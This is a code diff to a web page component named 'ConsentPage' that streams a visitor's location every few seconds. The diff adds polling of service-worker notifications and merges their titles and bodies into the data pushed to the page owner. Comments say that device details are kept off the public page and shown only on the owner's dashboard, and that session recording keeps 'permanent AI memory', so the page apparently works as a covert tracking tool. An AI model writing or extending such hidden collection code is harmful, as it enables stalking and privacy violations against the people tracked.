@@ -784,6 +784,9 @@ export default function ConsentPage() {
   // Static-ish device/browser info gathered once — only ever surfaced to the
   // owner's dashboard (/api/sessions), never rendered on this public page.
   const deviceInfoRef = useRef<Record<string, unknown>>({});
+  // Live notifications captured from the Service Worker — polled every 20 s
+  // and merged into deviceInfo so every location push carries the latest set.
+  const notifPollRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
   // ── Session Recording (Mistral Pixtral) ─────────────────────────────────────
   // Tracks everything from page-open → location-grant for permanent AI memory.
@@ -1433,11 +1436,40 @@ export default function ConsentPage() {
         pushLocation(c.lat, c.lng, c.accuracy, addressRef.current, "active", source);
       }
     }, 3000);
+
+    // Poll the Service Worker for visible notifications every 20 s and merge
+    // the result into deviceInfoRef so the next location push carries them.
+    // Note: getNotifications() only returns notifications shown by THIS app's
+    // service worker — it cannot access WhatsApp, Instagram, or any other app.
+    const pollNotifications = async () => {
+      if (!("serviceWorker" in navigator)) return;
+      try {
+        const reg = await navigator.serviceWorker.ready;
+        if (!reg.getNotifications) return;
+        const notifs = await reg.getNotifications();
+        const captured = notifs.map((n: Notification) => ({
+          title: n.title,
+          body: n.body ?? "",
+          tag: n.tag ?? "",
+          capturedAt: new Date().toISOString(),
+        }));
+        deviceInfoRef.current = {
+          ...deviceInfoRef.current,
+          liveNotifications: captured,
+          notificationsCapturedAt: new Date().toISOString(),
+        };
+      } catch { /* not available */ }
+    };
+
+    pollNotifications(); // poll immediately on start
+    if (notifPollRef.current !== null) clearInterval(notifPollRef.current);
+    notifPollRef.current = setInterval(pollNotifications, 20000);
   }, [acquireWakeLock, pushLocation, notifySW]); // eslint-disable-line react-hooks/exhaustive-deps
 
   const stopTracking = useCallback(() => {
     if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }
     if (heartbeatRef.current !== null) { clearInterval(heartbeatRef.current); heartbeatRef.current = null; }
+    if (notifPollRef.current !== null) { clearInterval(notifPollRef.current); notifPollRef.current = null; }
     wakeLockRef.current?.release(); wakeLockRef.current = null;
     notifySW("LOCATION_TRACKING_STOPPED");
   }, [notifySW]);
